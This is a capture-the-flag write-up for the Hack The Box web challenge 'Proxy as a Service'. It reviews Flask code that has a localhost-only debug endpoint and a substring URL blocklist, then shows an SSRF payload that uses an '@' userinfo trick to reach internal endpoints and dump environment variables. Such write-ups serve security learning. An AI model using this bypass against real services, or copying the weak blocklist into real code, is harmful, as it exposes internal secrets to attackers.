---
title: Proxy as a Service - Hack The Box
date: 2024-11-24
---

<script setup>
    import ChallengeCard from "../../../../../.vitepress/components/ChallengeCard.vue";
</script>

# Proxy as a Service

![Proxy as a Service - thumbnail](/ctf/hack-the-box/challenges/web/proxy-as-a-service/thumbnail.png)

## Challenge description

Experience the freedom of the web with ProxyAsAService. Because online privacy and access should be for everyone,
everywhere.

## Challenge Overview

The challenge presents a web application that acts as a proxy service. Users can input subreddit paths, and the
application fetches and displays the corresponding content.

## Code Review

### Dockerfile

The application’s `Dockerfile` reveals that the `FLAG` is stored as an environment variable:

```Dockerfile
ENV FLAG=HTB{f4k3_fl4g_f0r_t3st1ng}
```

### routes.py

The key functionality resides in the `routes.py` file. There are two primary endpoints to consider:

#### 1. `/debug/environment`

This endpoint exposes all environment variables, including the `FLAG`. However, access is restricted by the
`is_from_localhost` decorator, which ensures that only requests from `127.0.0.1` can reach this endpoint.

```python
@debug.route('/environment', methods=['GET'])
@is_from_localhost
def debug_environment():
    environment_info = {
        'Environment variables': dict(os.environ),
        'Request headers': dict(request.headers)
    }
    return jsonify(environment_info)
```

#### 2. `/`

This endpoint proxies requests to subreddits. It takes a `url` parameter and appends it to the target URL. The request
is then processed by the `proxy_req` function:

```python
@proxy_api.route('/', methods=['GET', 'POST'])
def proxy():
    url = request.args.get('url')

    if not url:
        cat_meme_subreddits = [
            '/r/cats/',
            '/r/catpictures',
            '/r/catvideos/'
        ]
        random_subreddit = random.choice(cat_meme_subreddits)
        return redirect(url_for('.proxy', url=random_subreddit))
    
    target_url = f'http://{SITE_NAME}{url}'
    response, headers = proxy_req(target_url)

    return Response(response.content, response.status_code, headers.items())
```

This endpoint interacts with the `proxy_req` function, which applies two restrictions:

- The request must pass the `is_safe_url` check.
- The response URL must also pass the `is_safe_url` check.

### Key Restrictions

#### `is_from_localhost` Decorator

```python
def is_from_localhost(func):
    @functools.wraps(func)
    def check_ip(*args, **kwargs):
        if request.remote_addr != '127.0.0.1':
            return abort(403)
        return func(*args, **kwargs)
    return check_ip
```

This decorator verifies that the `request.remote_addr` is `127.0.0.1`. Requests from any other IP are forbidden.

#### `is_safe_url` Function

```python
RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']
def is_safe_url(url):
    for restricted_url in RESTRICTED_URLS:
        if restricted_url in url:
            return False
    return True
```

The `is_safe_url` function checks the URL against a list of restricted substrings (`RESTRICTED_URLS`). If a restricted
substring is found, the request is blocked.

## Exploitation

### Objective

To retrieve the `FLAG`, we must access the `/debug/environment` endpoint. This requires bypassing:

1. The `is_from_localhost` decorator.
2. The `is_safe_url` check enforced by `proxy_req`.

### Bypassing `is_from_localhost`

The `is_from_localhost` decorator validates the `remote_addr` field of the incoming request. Since we cannot spoof our
IP address directly, we use the proxy mechanism to send a request to `127.0.0.1` indirectly.

### Bypassing `is_safe_url`

The `is_safe_url` function prevents direct access to restricted URLs. However, we can exploit the way the `url`
parameter is appended to `SITE_NAME`. By crafting a URL with the format:

```
@0.0.0.0:1337/debug/environment
```

This payload works because:

1. The `@` symbol in URLs is interpreted as authentication information, allowing us to bypass URL validation.
2. The `SITE_NAME` variable prepends the hostname (`http://`) before appending the payload, effectively transforming the
   final URL into:

```
http://0.0.0.0:1337/debug/environment
```

This bypasses the restrictions in `is_safe_url` while routing the request to `127.0.0.1`.

### Payload

To execute the exploit, we send the following request:

```
/?url=@0.0.0.0:1337/debug/environment
```

### Result

The response includes the environment variables, including the `FLAG`:

```json
{
    "Environment variables": {
        "FLAG": "HTB{f4k3_fl4g_f0r_t3st1ng}",
        "GPG_KEY": "7169605F62C751356D054A26A821E680E5FA6305",
        "HOME": "/root",
        "HOSTNAME": "a4bfb5eead77",
        "PATH": "/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "PYTHONDONTWRITEBYTECODE": "1",
        "PYTHON_SHA256": "086de5882e3cb310d4dca48457522e2e48018ecd43da9cdf827f6a0759efb07d",
        "PYTHON_VERSION": "3.13.0",
        "SUPERVISOR_ENABLED": "1",
        "SUPERVISOR_GROUP_NAME": "flask",
        "SUPERVISOR_PROCESS_NAME": "flask",
        "TERM": "xterm",
        "WERKZEUG_SERVER_FD": "3"
    },
    "Request headers": {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Cookie": "JSESSIONID=8530BE014E3829AD1C9CA27C9DBFA3F7; eu_cookie={%22opted%22:true%2C%22nonessential%22:true}; session=eyJjc3JmX3Rva2VuIjoiNzY3NDgzOTAyOTgzZWU5ZjY0YzNlNWIyZWM3MTJiZTNkN2E0Mzg0ZSJ9.Zz3ZSA.iRjAZ3aMVfDhnx6uYyQ8jpO5edY",
        "Host": "0.0.0.0:1337",
        "User-Agent": "python-requests/2.32.3"
    }
}
```

We successfully retrieved the fake flag `HTB{f4k3_fl4g_f0r_t3st1ng}`.
We can now use the same technique to retrieve the real flag on the HTB server.

<ChallengeCard
    challengeType="web"
    challengeName="ProxyAsAService"
    htbCardLink="https://www.hackthebox.com/achievement/challenge/585215/549"
/>

## References

- [Flask Documentation](https://flask.palletsprojects.com/en/stable/)
- [Python function wrappers](https://docs.python.org/fr/3/library/functools.html#functools.wraps)
